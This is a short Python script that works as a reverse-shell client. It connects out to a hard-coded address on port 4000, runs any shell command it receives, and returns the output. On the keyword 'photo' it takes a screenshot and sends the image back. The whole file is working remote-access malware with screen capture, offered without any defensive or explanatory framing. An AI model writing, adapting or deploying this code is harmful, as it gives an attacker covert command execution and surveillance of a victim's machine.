import socket 
import subprocess
from mss import mss 
import base64


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.134', 4000))

data = ""

def screen():
    with mss() as sct:
        return sct.shot(output="test.png")

while data != "exit":
    data = s.recv(1024).decode()
    if str(data) == "photo": 
        screen()
        with open("test.png", "rb") as img_file:
             s.send(img_file.read())
    else:
        data = s.recv(1024).decode()
        print(data)
        process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        out = process.stdout.read() + process.stderr.read()
        s.send(out) 
s.close()

